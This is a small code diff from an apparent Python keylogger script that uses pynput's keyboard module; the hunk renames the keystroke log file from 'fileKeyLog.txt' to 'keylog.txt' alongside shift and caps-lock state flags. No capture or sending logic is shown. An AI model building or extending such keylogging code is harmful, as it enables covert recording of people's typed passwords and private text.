@@ -3,7 +3,7 @@ import sys
 import time
 from pynput import keyboard
 
-path = 'fileKeyLog.txt'
+path = 'keylog.txt'
 shift = False
 caps = False
 
